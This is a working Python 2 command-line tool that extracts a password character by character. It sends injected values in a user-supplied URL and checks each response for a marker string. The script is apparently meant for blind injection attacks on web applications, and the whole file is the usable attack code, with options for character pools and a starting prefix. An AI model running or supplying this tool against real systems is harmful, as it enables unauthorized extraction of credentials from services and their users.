#!/usr/bin/env python

import urllib2
from optparse import OptionParser

chars_lows = [ 'a', 'z', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'q', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'w', 'x', 'c', 'v', 'b', 'n' ]
chars_ups = [ 'A', 'Z', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'Q', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'W', 'X', 'C', 'V', 'B', 'N' ]
chars_digits = [ '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' ]
chars_specials = [ ',', '?', ';', '.', ':', '/', '!', '%', '*',  '$', '"', '\'', '(', '-', '_', ')', '=', '}', ']', '@', '^', '\\', '`', '|', '[', '{', '~' ]

chars = []

# Checks a single password and tell if it's correct or not
def test(url, string, password):
	query = url.format(password)
	response = urllib2.urlopen(query)
	content = response.read()
	return string in content

# Prepares the characters used for bruteforcing password
def prepare(order):
	global chars
	for char in order:
		if char == 'L':
			chars = chars + chars_lows
		elif char == 'U':
			chars = chars + chars_ups
		elif char == 'D':
			chars = chars + chars_digits
		elif char == 'S':
			chars = chars + chars_specials
		else:
			print "Invalid character order : {}".format(char)
			return False
	return True

# Loop bruteforcing each character of password
def find(url, string, seed):
	for char in chars:
		newseed = seed + char
		if test(url, string, newseed):
			print "* {}".format(newseed)
			find(url, string, newseed)
			return
	print "* ---"
	print "* Password found : {}".format(seed)

# Options parser
parser = OptionParser()
parser.add_option("-u", dest="url", help="URL with payload. Replace password with {}")
parser.add_option("-s", dest="string", help="String to look for in response to check whether tested password fragment is correct")
parser.add_option("--seed", dest="seed", help="Starting password fragment. Will start with an empty password if this option isn't provided", default="")
parser.add_option("--chars", dest="characters", help="Characters pool and order ((L)ow, (U)p, (D)igits, (S)pecials). Default to DLUS if this options isn't provided", default="DLUS")
(options, args) = parser.parse_args()

if not options.url:
	parser.error("No URL provided")
if not options.string:
	parser.error("No string provided")

# Go
if prepare(options.characters):
	find(options.url, options.string, options.seed)
